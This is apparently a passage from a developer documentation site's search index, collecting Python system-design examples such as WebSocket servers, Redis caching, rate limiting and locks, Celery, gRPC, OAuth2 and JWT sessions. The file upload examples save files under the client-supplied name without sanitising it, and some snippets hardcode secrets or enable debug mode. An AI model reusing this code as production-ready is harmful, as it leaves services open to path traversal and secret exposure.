$DOCKER_HOST\n       - docker build -t $APP_NAME:$(git rev-parse --short HEAD) .\n\n   test:\n     stage: test\n     script:\n       - echo \"Running tests...\"\n</code></pre>"},{"location":"system_design/design/","title":"Basic vs. Advanced WebSocket Implementations","text":"<p>Below are two contrasting approaches for handling WebSocket connections in Python: a basic in-memory approach and a more advanced Redis-based approach for scalability.</p>"},{"location":"system_design/design/#1-basic-implementation-single-instance-in-memory","title":"1. Basic Implementation (Single-Instance, In-Memory)","text":"<p>Key Points - Stores WebSocket connections in a Python set or dict. - Fine for small-scale or prototype scenarios. - Not resilient: if the server restarts, all connections are lost. - Difficult to scale: you can\u2019t easily share in-memory state across multiple server instances.</p> <p>Code Example</p> <pre><code>from sanic import Sanic, Request, Websocket\nfrom sanic.exceptions import WebSocketClosed\n\napp = Sanic(\"WebSocketBasic\")\n\nconnected_clients = set()\n\n@app.websocket(\"/feed\")\nasync def feed(request: Request, ws: Websocket):\n    connected_clients.add(ws)\n    print(\"WebSocket connection established\")\n\n    try:\n        async for message in ws:\n            print(f\"Received message: {message}\")\n            # Broadcast to all *other* clients\n            for client in list(connected_clients):\n                if client != ws:\n                    try:\n                        await client.send(f\"Broadcast: {message}\")\n                    except Exception as e:\n                        print(f\"Error sending to client: {e}\")\n    except WebSocketClosed:\n        print(\"WebSocket connection closed\")\n    finally:\n        connected_clients.remove(ws)\n        print(\"Connection cleanup completed\")\n\n@app.route(\"/\")\nasync def index(request):\n    return {\"message\": \"Basic single-instance WebSocket server is running.\"}\n\nif __name__ == \"__main__\":\n    # This setup is not designed for multiple processes or servers.\n    app.run(host=\"0.0.0.0\", port=8000, workers=1)\n</code></pre>"},{"location":"system_design/design/#2-advanced-implementation-multi-instance-redis-pubsub","title":"2. Advanced Implementation (Multi-Instance, Redis Pub/Sub)","text":"<p>Key Points - Each server instance stores only its local WebSocket connections. - A Redis Pub/Sub channel is used to broadcast messages across instances. - This allows horizontal scaling: multiple workers or servers can handle clients concurrently. - If one server goes down, it only affects the clients connected to that instance.</p> <p>Code Example</p> <pre><code>import uuid\nimport asyncio\nimport aioredis\nfrom sanic import Sanic, Request, Websocket\nfrom sanic.exceptions import WebSocketClosed\n\napp = Sanic(\"DistributedWebSocketApp\")\n\nREDIS_URL = \"redis://localhost:6379\"\nREDIS_CHANNEL = \"ws_broadcast\"\n\n# Store local active WebSocket connections: { client_id: Websocket }\nlocal_ws_connections = {}\n\n@app.listener(\"before_server_start\")\nasync def setup_redis(app, loop):\n    \"\"\"\n    Create Redis pool and start a background task to listen for messages.\n    \"\"\"\n    app.ctx.redis = await aioredis.create_redis_pool(REDIS_URL)\n    app.ctx.pubsub = app.ctx.redis.pubsub()\n    await app.ctx.pubsub.subscribe(REDIS_CHANNEL)\n\n    async def redis_listener():\n        \"\"\"Listens on REDIS_CHANNEL for messages to broadcast locally.\"\"\"\n        while True:\n            try:\n                message = await app.ctx.pubsub.get_message(\n                    ignore_subscribe_messages=True, \n                    timeout=1.0\n                )\n                if message:\n                    # message['data'] is bytes; convert to string\n                    data = message[\"data\"].decode()\n                    # Broadcast to all local connections\n                    for ws in list(local_ws_connections.values()):\n                        try:\n                            await ws.send(f\"Redis broadcast -&gt; {data}\")\n                        except Exception:\n                            pass\n            except asyncio.CancelledError:\n                break\n            except Exception as e:\n                app.logger.error(f\"Redis listener error: {e}\")\n\n    # Schedule Redis subscriber listening in the background\n    app.add_task(redis_listener())\n\n@app.listener(\"after_server_stop\")\nasync def close_redis(app, loop):\n    \"\"\"Cleanly close Redis connections.\"\"\"\n    await app.ctx.pubsub.unsubscribe(REDIS_CHANNEL)\n    app.ctx.pubsub.close()\n    app.ctx.redis.close()\n    await app.ctx.redis.wait_closed()\n\n@app.websocket(\"/ws\")\nasync def handle_websocket(request: Request, ws: Websocket):\n    client_id = str(uuid.uuid4())\n    local_ws_connections[client_id] = ws\n    app.logger.info(f\"Client connected: {client_id}\")\n\n    try:\n        async for msg in ws:\n            app.logger.info(f\"Received from {client_id}: {msg}\")\n            # Publish incoming message to Redis, so all instances see it\n            await app.ctx.redis.publish(\n                REDIS_CHANNEL, \n                f\"{client_id} says: {msg}\"\n            )\n    except WebSocketClosed:\n        app.logger.info(f\"WebSocket closed: {client_id}\")\n    except Exception as e:\n        app.logger.error(f\"Error in websocket: {e}\")\n    finally:\n        # Remove from local connections\n        local_ws_connections.pop(client_id, None)\n        app.logger.info(f\"Client disconnected: {client_id}\")\n\n@app.route(\"/\")\nasync def index(request):\n    return {\"message\": \"Advanced WebSocket server instance with Redis Pub/Sub.\"}\n\nif __name__ == \"__main__\":\n    # Launch multiple instances on different ports as needed, \n    # all connecting to the same Redis instance.\n    #   python websocket_server.py --port=8001\n    #   python websocket_server.py --port=8002\n    app.run(host=\"0.0.0.0\", port=8001, workers=1)\n</code></pre>"},{"location":"system_design/design/#wrap-up","title":"Wrap-Up","text":"<ul> <li>Basic: </li> <li>Easiest to implement, but limited to a single process. </li> <li> <p>Fine for quick demos, small usage, or internal tools.</p> </li> <li> <p>Advanced (Redis Pub/Sub): </p> </li> <li>Allows you to scale out by running multiple server instances. </li> <li>A common, production-friendly approach for real-time apps that need more than a single machine. </li> <li>Fault-tolerant: a crash on one instance doesn\u2019t kill the entire system.</li> </ul>"},{"location":"system_design/design/#collection-of-system-design-examples","title":"Collection of System Design Examples","text":"<p>Below are various system design examples with code snippets. Each section is self-contained and demonstrates a distinct pattern or approach.</p>"},{"location":"system_design/design/#example-1-rate-limiter-with-redis","title":"Example 1: Rate Limiter with Redis","text":"<p>Scenario: Limit API calls per user within a time frame.</p> <pre><code>import time\nimport redis\n\nr = redis.StrictRedis(host='localhost', port=6379, db=0)\n\nRATE_LIMIT = 10  # max requests\nTIME_WINDOW = 60  # seconds\n\ndef is_rate_limited(user_id):\n    key = f\"rate_limit:{user_id}\"\n    current = r.get(key)\n\n    if current is None:\n        pipe = r.pipeline()\n        pipe.set(key, 1, ex=TIME_WINDOW)\n        pipe.execute()\n        return False\n    elif int(current) &lt; RATE_LIMIT:\n        r.incr(key)\n        return False\n    else:\n        return True\n\n# Usage\nuser_id = \"user123\"\nif is_rate_limited(user_id):\n    print(\"Rate limit exceeded. Try later.\")\nelse:\n    print(\"Request allowed.\")\n</code></pre>"},{"location":"system_design/design/#example-2-asynchronous-task-processing-with-celery","title":"Example 2: Asynchronous Task Processing with Celery","text":"<p>Scenario: Offload tasks to background workers.</p> <p>celery_app.py: <pre><code>from celery import Celery\n\napp = Celery('tasks', broker='pyamqp://guest@localhost//')\n\n@app.task\ndef long_running_task(x, y):\n    import time\n    time.sleep(5)\n    return x + y\n</code></pre></p> <p>producer.py: <pre><code>from celery_app import long_running_task\n\nresult = long_running_task.delay(10, 20)\nprint(\"Task sent. Waiting for result...\")\nprint(\"Result:\", result.get(timeout=10))\n</code></pre></p>"},{"location":"system_design/design/#example-3-circuit-breaker-pattern","title":"Example 3: Circuit Breaker Pattern","text":"<p>Scenario: Prevent repeated calls to a failing service.</p> <pre><code>import time\nimport requests\n\nclass CircuitBreaker:\n    def __init__(self, failure_threshold=3, recovery_timeout=30):\n        self.failure_threshold = failure_threshold\n        self.recovery_timeout = recovery_timeout\n        self.failure_count = 0\n        self.last_failure_time = None\n        self.open = False\n\n    def call(self, func, *args, **kwargs):\n        if self.open:\n            if time.time() - self.last_failure_time &gt; self.recovery_timeout:\n                self.open = False\n            else:\n                raise Exception(\"Circuit is open. Call blocked.\")\n\n        try:\n            result = func(*args, **kwargs)\n            self.failure_count = 0\n            return result\n        except Exception as e:\n            self.failure_count += 1\n            self.last_failure_time = time.time()\n            if self.failure_count &gt;= self.failure_threshold:\n                self.open = True\n            raise e\n\nbreaker = CircuitBreaker()\n\ndef unreliable_service():\n    response = requests.get(\"http://example.com/api\")\n    response.raise_for_status()\n    return response.json()\n\ntry:\n    result = breaker.call(unreliable_service)\n    print(\"Service call succeeded:\", result)\nexcept Exception as ex:\n    print(\"Service call failed or circuit open:\", ex)\n</code></pre>"},{"location":"system_design/design/#example-4-distributed-caching-with-redis","title":"Example 4: Distributed Caching with Redis","text":"<p>Scenario: Cache expensive database queries.</p> <pre><code>import redis\nimport time\nimport hashlib\n\nr = redis.StrictRedis(host='localhost', port=6379, db=0)\n\ndef get_data_from_db(query):\n    time.sleep(2)\n    return f\"Results for {query}\"\n\ndef cached_query(query, ttl=60):\n    key = f\"cache:{hashlib.sha256(query.encode()).hexdigest()}\"\n    result = r.get(key)\n    if result:\n        return result.decode()\n    result = get_data_from_db(query)\n    r.setex(key, ttl, result)\n    return result\n\nquery = \"SELECT * FROM users WHERE id = 1\"\nprint(cached_query(query))\n</code></pre>"},{"location":"system_design/design/#example-5-oauth2-with-flask-and-authlib","title":"Example 5: OAuth2 with Flask and Authlib","text":"<p>Scenario: OAuth2 Authorization Code Flow setup.</p> <pre><code>from flask import Flask, request, jsonify\nfrom authlib.integrations.flask_oauth2 import AuthorizationServer\nfrom authlib.oauth2.rfc6749 import grants\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'secret'\nauthorization = AuthorizationServer(app)\n\nclients = {}\ntokens = {}\n\nclass AuthorizationCodeGrant(grants.AuthorizationCodeGrant):\n    def save_authorization_code(self, code, request):\n        clients[code] = request.client_id\n\n    def query_authorization_code(self, code, client):\n        if clients.get(code) == client.client_id:\n            return code\n\n    def delete_authorization_code(self, authorization_code):\n        clients.pop(authorization_code, None)\n\n    def authenticate_user(self, authorization_code):\n        return {'user_id': '123'}\n\nauthorization.register_grant(AuthorizationCodeGrant)\n\n@app.route('/oauth/authorize', methods=['GET', 'POST'])\ndef authorize():\n    if request.method == 'GET':\n        return '&lt;form method=\"post\"&gt;&lt;button type=\"submit\"&gt;Authorize&lt;/button&gt;&lt;/form&gt;'\n    grant_user = {'user_id': '123'}\n    return authorization.create_authorization_response(grant_user=grant_user)\n\n@app.route('/oauth/token', methods=['POST'])\ndef issue_token():\n    return authorization.create_token_response()\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n</code></pre>"},{"location":"system_design/design/#example-6-webhook-handler","title":"Example 6: Webhook Handler","text":"<p>Scenario: Receive and process incoming webhook events.</p> <pre><code>from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/webhook', methods=['POST'])\ndef webhook():\n    data = request.json\n    print(\"Received webhook:\", data)\n    return jsonify({\"status\": \"received\"}), 200\n\nif __name__ == \"__main__\":\n    app.run(port=5000)\n</code></pre>"},{"location":"system_design/design/#example-7-file-upload-service-with-flask","title":"Example 7: File Upload Service with Flask","text":"<p>Scenario: Accept file uploads and save them.</p> <pre><code>from flask import Flask, request, jsonify\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = './uploads'\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return jsonify({\"error\": \"No file provided\"}), 400\n    file = request.files['file']\n    file.save(os.path.join(UPLOAD_FOLDER, file.filename))\n    return jsonify({\"status\": \"success\", \"filename\": file.filename})\n\nif __name__ == \"__main__\":\n    app.run(port=5000)\n</code></pre>"},{"location":"system_design/design/#example-8-chat-server-with-flask-socketio","title":"Example 8: Chat Server with Flask-SocketIO","text":"<p>Scenario: Simple real-time chat using WebSockets.</p> <pre><code>from flask import Flask\nfrom flask_socketio import SocketIO, emit\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'secret!'\nsocketio = SocketIO(app)\n\n@app.route('/')\ndef index():\n    return \"WebSocket Chat Server Running\"\n\n@socketio.on('message')\ndef handle_message(msg):\n    print('Received message:', msg)\n    emit('message', msg, broadcast=True)\n\nif __name__ == '__main__':\n    socketio.run(app, port=5000)\n</code></pre>"},{"location":"system_design/design/#example-9-restful-api-with-fastapi","title":"Example 9: RESTful API with FastAPI","text":"<p>Scenario: Create a simple RESTful endpoint.</p> <pre><code>from fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get(\"/items/{item_id}\")\nasync def read_item(item_id: int, q: str = None):\n    return {\"item_id\": item_id, \"q\": q}\n\nif __name__ == \"__main__\":\n    import uvicorn\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n</code></pre>"},{"location":"system_design/design/#example-10-grpc-communication-in-python","title":"Example 10: gRPC Communication in Python","text":"<p>Scenario: Set up a basic gRPC server and client.</p> <p><code>example.proto</code>: <pre><code>syntax = \"proto3\";\n\nservice Greeter {\n  rpc SayHello (HelloRequest) returns (HelloReply) {}\n}\n\nmessage HelloRequest {\n  string name = 1;\n}\n\nmessage HelloReply {\n  string message = 1;\n}\n</code></pre></p> <p>Generate Python code: <pre><code>python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. example.proto\n</code></pre></p> <p>Server (server.py): <pre><code>from concurrent import futures\nimport grpc\nimport time\nimport example_pb2\nimport example_pb2_grpc\n\nclass Greeter(example_pb2_grpc.GreeterServicer):\n    def SayHello(self, request, context):\n        return example_pb2.HelloReply(message='Hello, ' + request.name)\n\nserver = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\nexample_pb2_grpc.add_GreeterServicer_to_server(Greeter(), server)\nserver.add_insecure_port('[::]:50051')\nserver.start()\n\ntry:\n    while True:\n        time.sleep(86400)\nexcept KeyboardInterrupt:\n    server.stop(0)\n</code></pre></p> <p>Client (client.py): <pre><code>import grpc\nimport example_pb2\nimport example_pb2_grpc\n\nchannel = grpc.insecure_channel('localhost:50051')\nstub = example_pb2_grpc.GreeterStub(channel)\nresponse = stub.SayHello(example_pb2.HelloRequest(name='World'))\nprint(\"Greeter client received: \" + response.message)\n</code></pre></p> <p>This consolidated Markdown file presents various system design examples with code. Each snippet is encapsulated and ready for use. Further topics can be added similarly as needed.</p>"},{"location":"system_design/design/#collection-of-system-design-examples-continued","title":"Collection of System Design Examples (Continued)","text":"<p>Below are 10 more diverse system design examples with code snippets, compiled together.</p>"},{"location":"system_design/design/#example-11-event-driven-architecture-with-kafka","title":"Example 11: Event-Driven Architecture with Kafka","text":"<p>Scenario: Produce and consume messages using Apache Kafka.</p> <p>Prerequisites: Install <code>kafka-python</code> (<code>pip install kafka-python</code>) and have a Kafka cluster running.</p> <p>Producer Example <pre><code>from kafka import KafkaProducer\nproducer = KafkaProducer(bootstrap_servers='localhost:9092')\nfor i in range(5):\n    producer.send('my-topic', b'Sample message %d' % i)\nproducer.flush()\n</code></pre></p> <p>Consumer Example <pre><code>from kafka import KafkaConsumer\nconsumer = KafkaConsumer('my-topic', \n                         bootstrap_servers='localhost:9092', \n                         auto_offset_reset='earliest')\nfor message in consumer:\n    print(f\"Received: {message.value.decode()}\")\n</code></pre></p>"},{"location":"system_design/design/#example-12-simple-event-sourcing-mechanism","title":"Example 12: Simple Event Sourcing Mechanism","text":"<p>Scenario: Record changes as events and rebuild state by replaying them.</p> <pre><code>import json\n\n# Event Store (in-memory for demo)\nevent_store = []\n\ndef record_event(event_type, data):\n    event = {\"type\": event_type, \"data\": data}\n    event_store.append(event)\n\ndef replay_events():\n    state = {}\n    for event in event_store:\n        if event[\"type\"] == \"user_created\":\n            state[event[\"data\"][\"id\"]] = event[\"data\"]\n        elif event[\"type\"] == \"user_updated\":\n            state[event[\"data\"][\"id\"]].update(event[\"data\"])\n    return state\n\n# Usage\nrecord_event(\"user_created\", {\"id\": 1, \"name\": \"Alice\"})\nrecord_event(\"user_updated\", {\"id\": 1, \"email\": \"alice@example.com\"})\nprint(replay_events())\n</code></pre>"},{"location":"system_design/design/#example-13-simple-notification-system-with-websockets","title":"Example 13: Simple Notification System with WebSockets","text":"<p>Scenario: Notify connected clients in real-time using Flask-SocketIO.</p> <pre><code>from flask import Flask\nfrom flask_socketio import SocketIO, emit\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'secret!'\nsocketio = SocketIO(app)\n\n@app.route('/')\ndef index():\n    return \"Notification Server Running\"\n\n@app.route('/notify', methods=['POST'])\ndef notify():\n    message = \"Notification message\"  # Typically extracted from request data\n    socketio.emit('notification', {'data': message})\n    return \"Notification sent!\"\n\nif __name__ == '__main__':\n    socketio.run(app, port=5000)\n</code></pre>"},{"location":"system_design/design/#example-14-simple-url-shortener","title":"Example 14: Simple URL Shortener","text":"<p>Scenario: Create short URLs mapping to original URLs.</p> <pre><code>from flask import Flask, request, redirect, jsonify\nimport hashlib\n\napp = Flask(__name__)\nurl_mapping = {}\n\ndef shorten_url(original_url):\n    short_hash = hashlib.sha256(original_url.encode()).hexdigest()[:6]\n    url_mapping[short_hash] = original_url\n    return short_hash\n\n@app.route('/shorten', methods=['POST'])\ndef create_short_url():\n    data = request.json\n    original_url = data.get('url')\n    short_url = shorten_url(original_url)\n    return jsonify({\"short_url\": request.host_url + short_url})\n\n@app.route('/&lt;short_url&gt;')\ndef redirect_url(short_url):\n    original_url = url_mapping.get(short_url)\n    if original_url:\n        return redirect(original_url)\n    return \"URL not found\", 404\n\nif __name__ == \"__main__\":\n    app.run(port=5000)\n</code></pre>"},{"location":"system_design/design/#example-15-data-warehouse-etl-pipeline-simplified","title":"Example 15: Data Warehouse ETL Pipeline (Simplified)","text":"<p>Scenario: Extract, Transform, and Load data from a source to a target.</p> <pre><code>import csv\nimport sqlite3\n\n# Extract: read CSV file\ndef extract_data(csv_file):\n    with open(csv_file, newline='') as f:\n        reader = csv.DictReader(f)\n        return list(reader)\n\n# Transform: simple transformation (e.g., converting strings to integers)\ndef transform_data(data):\n    for row in data:\n        row['age'] = int(row['age'])\n    return data\n\n# Load: insert data into SQLite database\ndef load_data(data, db_file):\n    conn = sqlite3.connect(db_file)\n    cursor = conn.cursor()\n    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER, name TEXT, age INTEGER)')\n    for row in data:\n        cursor.execute('INSERT INTO users VALUES (?, ?, ?)', (row['id'], row['name'], row['age']))\n    conn.commit()\n    conn.close()\n\n# Running the ETL process\ndata = extract_data('users.csv')\ndata = transform_data(data)\nload_data(data, 'users.db')\n</code></pre>"},{"location":"system_design/design/#example-16-distributed-lock-with-redis","title":"Example 16: Distributed Lock with Redis","text":"<p>Scenario: Use Redis to implement a simple distributed lock.</p> <pre><code>import redis\nimport time\n\nr = redis.StrictRedis(host='localhost', port=6379, db=0)\n\ndef acquire_lock(lock_name, timeout=10):\n    lock = r.lock(lock_name, timeout=timeout)\n    acquired = lock.acquire(blocking=True)\n    return lock if acquired else None\n\ndef release_lock(lock):\n    lock.release()\n\n# Usage\nlock = acquire_lock('my_lock')\nif lock:\n    try:\n        print(\"Lock acquired, processing critical section.\")\n        # Critical section code\n        time.sleep(2)\n    finally:\n        release_lock(lock)\n        print(\"Lock released.\")\nelse:\n    print(\"Failed to acquire lock.\")\n</code></pre>"},{"location":"system_design/design/#example-17-simple-file-storage-service-s3-like","title":"Example 17: Simple File Storage Service (S3-like)","text":"<p>Scenario: Upload and download files using Flask.</p> <pre><code>from flask import Flask, request, send_from_directory, jsonify\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = './files'\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    file = request.files['file']\n    file.save(os.path.join(UPLOAD_FOLDER, file.filename))\n    return jsonify({\"message\": \"File uploaded\", \"filename\": file.filename})\n\n@app.route('/download/&lt;filename&gt;', methods=['GET'])\ndef download(filename):\n    return send_from_directory(UPLOAD_FOLDER, filename)\n\nif __name__ == \"__main__\":\n    app.run(port=5000)\n</code></pre>"},{"location":"system_design/design/#example-18-implementing-grpc-streaming-server-side","title":"Example 18: Implementing gRPC Streaming (Server-Side)","text":"<p>Scenario: Stream responses from a gRPC server.</p> <p>streaming.proto: <pre><code>syntax = \"proto3\";\n\nservice Streamer {\n  rpc StreamData(Empty) returns (stream DataChunk) {}\n}\n\nmessage Empty {}\n\nmessage DataChunk {\n  string content = 1;\n}\n</code></pre></p> <p>Generate Python code: <pre><code>python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. streaming.proto\n</code></pre></p> <p>Server (stream_server.py): <pre><code>import time\nfrom concurrent import futures\nimport grpc\nimport streaming_pb2\nimport streaming_pb2_grpc\n\nclass StreamerServicer(streaming_pb2_grpc.StreamerServicer):\n    def StreamData(self, request, context):\n        for i in range(5):\n            yield streaming_pb2.DataChunk(content=f\"Chunk {i}\")\n            time.sleep(1)\n\nserver = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\nstreaming_pb2_grpc.add_StreamerServicer_to_server(StreamerServicer(), server)\nserver.add_insecure_port('[::]:50052')\nserver.start()\nserver.wait_for_termination()\n</code></pre></p> <p>Client (stream_client.py): <pre><code>import grpc\nimport streaming_pb2\nimport streaming_pb2_grpc\n\nchannel = grpc.insecure_channel('localhost:50052')\nstub = streaming_pb2_grpc.StreamerStub(channel)\nfor chunk in stub.StreamData(streaming_pb2.Empty()):\n    print(\"Received:\", chunk.content)\n</code></pre></p>"},{"location":"system_design/design/#example-19-implementing-feature-flags","title":"Example 19: Implementing Feature Flags","text":"<p>Scenario: Toggle features on/off dynamically.</p> <pre><code># Simple in-memory feature flag system\nfeature_flags = {\n    \"new_dashboard\": False,\n    \"beta_feature\": True\n}\n\ndef is_feature_enabled(feature_name):\n    return feature_flags.get(feature_name, False)\n\n# Usage\nif is_feature_enabled(\"new_dashboard\"):\n    print(\"Render new dashboard\")\nelse:\n    print(\"Render old dashboard\")\n</code></pre>"},{"location":"system_design/design/#example-20-implementing-a-distributed-lock-service","title":"Example 20: Implementing a Distributed Lock Service","text":"<p>Scenario: A more robust distributed lock using Redlock algorithm with Redis.</p> <pre><code>import redis\nimport uuid\nimport time\n\nclass Redlock:\n    def __init__(self, redis_client, lock_key, ttl=10000):\n        self.redis = redis_client\n        self.lock_key = lock_key\n        self.ttl = ttl\n        self.lock_value = str(uuid.uuid4())\n\n    def acquire(self):\n        result = self.redis.set(self.lock_key, self.lock_value, nx=True, px=self.ttl)\n        return result\n\n    def release(self):\n        # Lua script for safe delete\n        script = \"\"\"\n        if redis.call(\"get\",KEYS[1]) == ARGV[1] then\n            return redis.call(\"del\",KEYS[1])\n        else\n            return 0\n        end\n        \"\"\"\n        self.redis.eval(script, 1, self.lock_key, self.lock_value)\n\nr = redis.StrictRedis(host='localhost', port=6379, db=0)\nlock = Redlock(r, \"resource_lock\")\nif lock.acquire():\n    try:\n        print(\"Lock acquired, processing resource.\")\n        # Critical resource processing\n        time.sleep(2)\n    finally:\n        lock.release()\n        print(\"Lock released.\")\nelse:\n    print(\"Could not acquire lock.\")\n</code></pre> <pre><code>### Example 21: Cache Eviction Strategy Implementation\n\n**Scenario**: Implement an LRU (Least Recently Used) cache in Python.\n\n```python\nfrom collections import OrderedDict\n\nclass LRUCache:\n    def __init__(self, capacity: int):\n        self.cache = OrderedDict()\n        self.capacity = capacity\n\n    def get(self, key):\n        if key not in self.cache:\n            return -1\n        # Move key to end to mark as recently used\n        self.cache.move_to_end(key)\n        return self.cache[key]\n\n    def put(self, key, value):\n        if key in self.cache:\n            # Update existing key and mark as recently used\n            self.cache.move_to_end(key)\n        self.cache[key] = value\n        if len(self.cache) &gt; self.capacity:\n            # Pop the first (least recently used) item\n            self.cache.popitem(last=False)\n\n# Usage\ncache = LRUCache(2)\ncache.put(1, 'A')\ncache.put(2, 'B')\nprint(cache.get(1))  # 'A'\ncache.put(3, 'C')    # Evicts key 2\nprint(cache.get(2))  # -1 (not found)\n</code></pre>"},{"location":"system_design/design/#example-22-microservice-communication-via-grpc-with-load-balancing","title":"Example 22: Microservice Communication via gRPC with Load Balancing","text":"<p>Scenario: Implement client-side load balancing among multiple service instances using gRPC.</p> <p>Setup: Assume multiple Greeter services running on different ports.</p> <pre><code>import grpc\nimport random\nimport example_pb2\nimport example_pb2_grpc\n\n# List of available server addresses\nserver_addresses = ['localhost:50051', 'localhost:50052', 'localhost:50053']\n\ndef get_stub():\n    # Randomly pick a server for each request (simple load balancing)\n    channel = grpc.insecure_channel(random.choice(server_addresses))\n    return example_pb2_grpc.GreeterStub(channel)\n\nstub = get_stub()\nresponse = stub.SayHello(example_pb2.HelloRequest(name='LoadBalancedClient'))\nprint(\"Response:\", response.message)\n</code></pre>"},{"location":"system_design/design/#example-23-actor-model-with-pykka","title":"Example 23: Actor Model with Pykka","text":"<p>Scenario: Use the actor model to manage concurrent state.</p> <p>Prerequisites: Install <code>Pykka</code> (<code>pip install pykka</code>).</p> <pre><code>import pykka\n\nclass CounterActor(pykka.ThreadingActor):\n    def __init__(self):\n        super().__init__()\n        self.count = 0\n\n    def on_receive(self, message):\n        if message.get('cmd') == 'increment':\n            self.count += 1\n            return self.count\n        elif message.get('cmd') == 'get':\n            return self.count\n\n# Start an actor\ncounter = CounterActor.start()\n\n# Interact with the actor\nfuture = counter.ask({'cmd': 'increment'})\nprint(\"Count after increment:\", future)\n\ncurrent = counter.ask({'cmd': 'get'})\nprint(\"Current count:\", current)\n\ncounter.stop()\n</code></pre>"},{"location":"system_design/design/#example-24-service-discovery-with-consul","title":"Example 24: Service Discovery with Consul","text":"<p>Scenario: Register and discover services using Consul's HTTP API.</p> <p>Prerequisites: Consul agent running locally.</p> <pre><code>import requests\nimport time\n\nCONSUL_ADDRESS = 'http://localhost:8500'\n\ndef register_service(name, service_id, address, port):\n    url = f\"{CONSUL_ADDRESS}/v1/agent/service/register\"\n    payload = {\n        \"Name\": name,\n        \"ID\": service_id,\n        \"Address\": address,\n        \"Port\": port,\n        \"Check\": {\n            \"HTTP\": f\"http://{address}:{port}/health\",\n            \"Interval\": \"10s\"\n        }\n    }\n    response = requests.put(url, json=payload)\n    print(\"Service registration:\", response.status_code)\n\ndef discover_service(name):\n    url = f\"{CONSUL_ADDRESS}/v1/catalog/service/{name}\"\n    response = requests.get(url)\n    services = response.json()\n    return services\n\n# Register a sample service\nregister_service(\"my-service\", \"my-service-1\", \"127.0.0.1\", 5000)\ntime.sleep(2)  # Wait for registration\n\n# Discover the registered service\nservices = discover_service(\"my-service\")\nprint(\"Discovered services:\", services)\n</code></pre>"},{"location":"system_design/design/#example-25-distributed-task-queue-with-redis-and-rq","title":"Example 25: Distributed Task Queue with Redis and RQ","text":"<p>Scenario: Use Redis Queue (RQ) for simple background task processing.</p> <p>Prerequisites: Install <code>rq</code> (<code>pip install rq</code>) and run a Redis server.</p> <p>tasks.py: <pre><code>import time\n\ndef background_task(x, y):\n    time.sleep(5)  # Simulate long computation\n    return x + y\n</code></pre></p> <p>enqueue_task.py: <pre><code>from redis import Redis\nfrom rq import Queue\nfrom tasks import background_task\n\n# Connect to Redis server\nredis_conn = Redis()\nq = Queue(connection=redis_conn)\n\n# Enqueue a task\njob = q.enqueue(background_task, 10, 20)\nprint(f\"Enqueued job: {job.id}\")\n\n# Wait for the job to finish\nresult = job.result or job.wait(timeout=10)\nprint(\"Task result:\", result)\n</code></pre></p> <p>To process tasks, run an RQ worker in another terminal: <pre><code>rq worker\n</code></pre> ```</p>"},{"location":"system_design/prob/","title":"Common System-Design Problems &amp; Solutions with Code Examples","text":"<p>Below, we expand on the common system-design problems &amp; solutions by including code examples that illustrate how one might implement or configure aspects of these solutions. Each example is simplified for clarity and demonstration purposes.</p>"},{"location":"system_design/prob/#1-session-management-in-a-multi-server-environment","title":"1. Session Management in a Multi-Server Environment","text":"<p>Problem Recap - Users log in; session data is stored locally. - Multiple servers cause session inconsistency.</p> <p>Solution Approaches with Code Examples</p>"},{"location":"system_design/prob/#central-session-store-using-redis-python-with-flask-and-flask-session","title":"Central Session Store using Redis (Python with Flask and Flask-Session)","text":"<pre><code>from flask import Flask, session\nfrom flask_session import Session\nimport redis\n\napp = Flask(__name__)\napp.config['SESSION_TYPE'] = 'redis'\napp.config['SESSION_REDIS'] = redis.Redis(host='localhost', port=6379)\nSession(app)\n\n@app.route('/')\ndef index():\n    session['key'] = 'value'\n    return 'Session set!'\n</code></pre>"},{"location":"system_design/prob/#token-based-auth-jwt-example-python-with-flask","title":"Token-Based Auth (JWT) Example (Python with Flask)","text":"<pre><code>from flask import Flask, request, jsonify\nimport jwt\nimport datetime\n\napp = Flask(__name__)\nSECRET_KEY = 'your-secret'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    # Assume user is validated\n    token = jwt.encode(\n        {'user_id': 1, 'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)},\n        SECRET_KEY, algorithm='HS256')\n    return jsonify(token=token)\n\n@app.route('/protected')\ndef protected():\n    token = request.headers.get('Authorization').split()[1]\n    try:\n        data = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])\n        return jsonify(message='Protected data', user_id=data['user_id'])\n    except jwt.ExpiredSignatureError:\n        return jsonify(message='Token expired'), 401\n    except jwt.InvalidTokenError:\n        return jsonify(message='Invalid token'), 401\n</code></pre>"},{"location":"system_design/prob/#2-database-write-scalability","title":"2. Database Write Scalability","text":"<p>Solution Approach: Sharding with Pseudocode in Python</p> <pre><code>NUM_SHARDS = 4\n\ndef get_db_for_user(user_id):\n    shard_id = user_id % NUM_SHARDS\n    # Assuming a function that returns a DB connection based on shard_id\n    return connect_to_db(shard_id)\n\ndef save_user_data(user_id, data):\n    db = get_db_for_user(user_id)\n    db.insert('users', data)\n</code></pre>"},{"location":"system_design/prob/#3-distributed-cache-invalidation","title":"3. Distributed Cache Invalidation","text":"<p>Solution Approach: Pub/Sub for Invalidation using Redis (Python)</p> <pre><code>import redis\n\nr = redis.Redis()\n\n# Publisher\ndef update_data(key, value):\n    # Update the underlying data store...\n    r.publish('cache_invalidate', key)\n\n# Subscriber (in each server instance)\ndef subscribe_invalidation():\n    pubsub = r.pubsub()\n    pubsub.subscribe('cache_invalidate')\n    for message in pubsub.listen():\n        if message['type'] == 'message':\n            key = message['data'].decode('utf-8')\n            # 